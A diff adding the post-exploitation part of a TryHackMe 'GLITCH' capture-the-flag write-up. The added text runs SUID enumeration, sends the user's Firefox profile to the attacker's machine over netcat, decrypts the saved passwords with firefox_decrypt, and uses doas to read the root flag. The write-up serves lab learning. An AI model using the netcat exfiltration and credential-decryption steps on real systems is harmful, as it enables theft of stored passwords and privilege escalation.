@@ -80,6 +80,66 @@ The parameter to use is cmd, which, after sending the request again on Burp it r
 
 At this point, we need to access a shell so that we can solve the other problems.
 
+Igot a little bit stuck and frustated as I was not able to deploy shell at first, then I came a cross this [writeup](https://github.com/alirezac0/TryHackMe-Writeups/tree/master/GLITCH) where he uses curl to deliver the payload in order to get the shell
+
+After getting the shell you can see the user flag by navigating throu to `home/user` directory.
+
+For the root flag we took the hint where it saya my friend says sudo is bloat, but as I navigated throu the shell and used this command `ls -la`. 
+
+Also we can use find to see what wecan do in order to access the root.
+```bash
+find / -type f -user root -perm -u=s 2>/dev/null
+```
+```bash
+user@ubuntu:~$ ls -la
+ls -la
+total 48
+drwxr-xr-x   8 user user  4096 Jan 27 10:33 .
+drwxr-xr-x   4 root root  4096 Jan 15 14:13 ..
+lrwxrwxrwx   1 root root     9 Jan 21 09:05 .bash_history -> /dev/null
+-rw-r--r--   1 user user  3771 Apr  4  2018 .bashrc
+drwx------   2 user user  4096 Jan  4 13:41 .cache
+drwxrwxrwx   4 user user  4096 Jan 27 10:32 .firefox
+drwx------   3 user user  4096 Jan  4 13:41 .gnupg
+drwxr-xr-x 270 user user 12288 Jan  4 14:07 .npm
+drwxrwxr-x   5 user user  4096 Apr  2 16:11 .pm2
+drwx------   2 user user  4096 Jan 21 08:47 .ssh
+-rw-rw-r--   1 user user    22 Jan  4 15:29 user.txt
+```
+
+I found a `.firefox` directory where there might be potentially passwords stored for our user as we can see that we have user void.
+
+In oder to check the content in the .firefox directory we need to export the directory in to the attackers machine and use a tool called [firefox_decrypt](https://github.com/unode/firefox_decrypt)
+
+to export weare going to use the foollowing command
+```bash
+#on the target machine use
+
+tar cf — .firefox/ | nc attacker-machine-ip 5555
+
+#before running this ensure you have set a listener on the attacker machine using
+
+nc -vlp 5555 | tar xf -
+```
+After that we can use know use our tool and decrypt the directory using 
+```bash
+python3 firefox_decrypt.py .firefox
+```
+Now we can see the pass word for void
+
+To use this password in order to access the void decrectory abd be able to read the root flag we shall use doas using this command
+```bash
+su - v0id -c "doas -u root bash -c 'cat /root/root.txt'"
+```
+
+
+
+
+
+
+
+
+
 
 
 
